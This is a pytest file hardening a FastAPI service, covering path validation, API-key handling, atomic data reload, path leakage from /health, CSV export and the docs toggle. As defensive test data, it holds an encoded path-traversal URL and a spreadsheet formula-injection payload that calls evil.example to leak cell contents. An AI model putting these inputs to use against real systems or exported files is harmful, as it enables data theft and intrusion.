"""api/main.py hardening: path params, key comparison, atomic reload, CSV formula cells, docs toggle."""
import csv
import importlib
import io
import json

from fastapi.testclient import TestClient

import api.main as api
from test_api import KEY, client  # noqa: F401  (the shared fixture)

H = {"X-API-Key": KEY}


def test_worklist_month_and_district_are_validated(client, tmp_path):
    outside = client.site.parent / "district-3.csv"          # one level above worklists/
    outside.write_text("facility_id,name\nOUTSIDE,should never be served\n", encoding="utf-8")
    # (a literal "/../" is normalised away by the client before sending, so only the encoded form reaches the app)
    for url in ["/v1/worklists/%2e%2e/districts/3", "/v1/worklists/2026-13/districts/3",
                "/v1/worklists/2026-10/districts/0", "/v1/worklists/2026-10/districts/10"]:
        r = client.get(url, headers=H)
        assert r.status_code in (404, 422), (url, r.status_code)
        assert "OUTSIDE" not in r.text
    assert client.get("/v1/worklists/2026-10/districts/3", headers=H).status_code == 200


def test_non_ascii_key_is_a_401_not_a_500(client):
    r = client.get("/v1/summary", headers={"X-API-Key": b"\xe9\xe9"})   # raw non-ASCII bytes
    assert r.status_code == 401


def test_failed_reload_keeps_serving_the_previous_export(client):
    before = client.get("/v1/summary", headers=H).json()
    meta = json.loads((client.site / "meta.json").read_text(encoding="utf-8"))
    (client.site / "meta.json").write_text(json.dumps({**meta, "run": "forward_2026-10-20"}), encoding="utf-8")
    (client.site / "facilities.geojson").write_text('{"type": "FeatureCollection", "features": [', encoding="utf-8")
    r = client.post("/v1/admin/reload", headers=H)
    assert r.status_code == 500 and "previous export" in r.json()["detail"]
    after = client.get("/v1/summary", headers=H).json()
    assert after["run"] == before["run"] and after["places"] == before["places"]
    assert client.get("/health").json()["run"] == before["run"]


def test_health_does_not_reveal_server_paths(client, monkeypatch, tmp_path):
    monkeypatch.setenv("SDFOOD_DATA_DIR", str(tmp_path / "secret-mount" / "site"))
    api.get_store.cache_clear()
    body = client.get("/health").json()
    assert body["status"] == "no data" and "secret-mount" not in json.dumps(body)


def test_csv_cells_that_would_run_as_formulas_are_neutralised(client):
    idx = json.loads((client.site / "facilities.geojson").read_text(encoding="utf-8"))
    idx["features"][0]["properties"]["name"] = '=HYPERLINK("http://evil.example/?"&A1,"click")'
    (client.site / "facilities.geojson").write_text(json.dumps(idx), encoding="utf-8")
    assert client.post("/v1/admin/reload", headers=H).status_code == 200
    rows = list(csv.reader(io.StringIO(client.get("/v1/export.csv", headers=H).text)))
    names = [r[1] for r in rows[1:]]
    assert "'=HYPERLINK(\"http://evil.example/?\"&A1,\"click\")" in names
    assert all(not n.startswith("=") for n in names)
    assert api.csv_cell("-12.5") == "-12.5" and api.csv_cell("+1 555") == "'+1 555" and api.csv_cell(7) == 7


def test_docs_can_be_turned_off(monkeypatch):
    monkeypatch.setenv("SDFOOD_API_DOCS", "0")
    mod = importlib.reload(api)
    try:
        c = TestClient(mod.app)
        assert c.get("/docs").status_code == 404 and c.get("/openapi.json").status_code == 404
    finally:
        monkeypatch.delenv("SDFOOD_API_DOCS")
        importlib.reload(api)
